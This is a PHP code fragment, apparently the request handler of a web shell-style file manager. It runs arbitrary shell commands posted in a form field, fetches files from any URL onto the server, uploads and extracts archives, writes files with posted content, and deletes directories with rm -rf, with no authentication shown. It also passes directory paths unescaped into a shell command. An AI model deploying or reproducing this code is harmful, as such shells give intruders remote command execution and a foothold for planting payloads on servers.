// ==================== HANDLE POST ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ===== UPLOAD ZIP + AUTO EXTRACT =====
    if (!empty($_FILES['zip_file']) && $_FILES['zip_file']['error'] === UPLOAD_ERR_OK) {
        $zipTmp = $_FILES['zip_file']['tmp_name'];
        $zipName = cleanName(basename($_FILES['zip_file']['name']));
        
        $zipPath = $dir . $zipName;
        if (@move_uploaded_file($zipTmp, $zipPath)) {
            @chmod($zipPath, 0644);
            
            $extracted = false;
            
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($zipPath) === true) {
                    if ($zip->extractTo($dir)) {
                        $extracted = true;
                        $messages[] = "📦 Extracted: " . $zipName . " (" . $zip->numFiles . " files)";
                    }
                    $zip->close();
                }
            }
            
            if (!$extracted && function_exists('shell_exec')) {
                $cmd = 'cd "' . $dir . '" && unzip -o "' . $zipPath . '" 2>&1';
                $output = @shell_exec($cmd);
                if ($output && (strpos($output, 'inflating') !== false || strpos($output, 'extracting') !== false)) {
                    $extracted = true;
                    $messages[] = "📦 Extracted via CLI: " . $zipName;
                }
            }
            
            if (!$extracted) {
                $messages[] = "❌ Failed to extract: " . $zipName . " (file saved)";
            }
        } else {
            $messages[] = "❌ Failed to upload zip: " . $zipName;
        }
    }
    
    // ===== UPLOAD FILE =====
    if (!empty($_FILES['file'])) {
        foreach ($_FILES['file']['name'] as $k => $name) {
            if ($_FILES['file']['error'][$k] === UPLOAD_ERR_OK) {
                $target = $dir . cleanName(basename($name));
                if (@move_uploaded_file($_FILES['file']['tmp_name'][$k], $target)) {
                    @chmod($target, 0644);
                    $messages[] = "✅ Uploaded: " . basename($name);
                }
            }
        }
    }
    
    // ===== DOWNLOAD URL =====
    if (isset($_POST['download_url']) && !empty($_POST['url'])) {
        $url = trim($_POST['url']);
        $filename = !empty($_POST['filename']) ? cleanName($_POST['filename']) : basename(parse_url($url, PHP_URL_PATH));
        if (empty($filename)) $filename = 'file_' . time() . '.bin';
        $target = $dir . $filename;
        if (downloadFile($url, $target)) {
            $messages[] = "✅ Downloaded: " . $filename;
        } else {
            $messages[] = "❌ Failed to download: " . $url;
        }
    }
    
    // ===== COMMAND =====
    if (isset($_POST['cmd']) && trim($_POST['cmd'])) {
        $cmdOutput = executeCmd($_POST['cmd'], $dir);
    }
    
    // ===== CREATE =====
    if (isset($_POST['create'])) {
        $name = cleanName($_POST['name']);
        if ($name) {
            if ($_POST['type'] === 'folder') {
                if (@mkdir($dir . $name, 0755, true)) $messages[] = "📁 Created folder: " . $name;
                else $messages[] = "❌ Failed to create folder: " . $name;
            } else {
                if (@file_put_contents($dir . $name, $_POST['content'])) {
                    @chmod($dir . $name, 0644);
                    $messages[] = "📄 Created file: " . $name;
                } else {
                    $messages[] = "❌ Failed to create file: " . $name;
                }
            }
        }
    }
    
    // ===== DELETE SELECTED =====
    if (isset($_POST['delete_selected']) && !empty($_POST['items'])) {
        $count = 0;
        $items = explode('|||', $_POST['items']);
        foreach ($items as $item) {
            $target = $dir . basename($item);
            if (@is_dir($target)) {
                executeCmd("rm -rf " . escapeshellarg($target), $dir);
                $count++;
            } elseif (@file_exists($target)) {
                @unlink($target);
                $count++;
            }
        }
        $messages[] = "🗑 Deleted " . $count . " items";
    }
    
    // ===== RENAME =====
    if (isset($_POST['rename'])) {
        $old = $dir . basename($_POST['old_name']);
        $new = $dir . cleanName($_POST['new_name']);
        if (@file_exists($old) && !@file_exists($new) && @rename($old, $new)) {
            $messages[] = "✏️ Renamed: " . $_POST['old_name'] . " → " . $_POST['new_name'];
        } else {
            $messages[] = "❌ Rename failed";
        }
    }
    
    $_SESSION['msgs'] = $messages;
    $_SESSION['cmdOut'] = $cmdOutput;
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . urlencode($dir));
    exit;
}

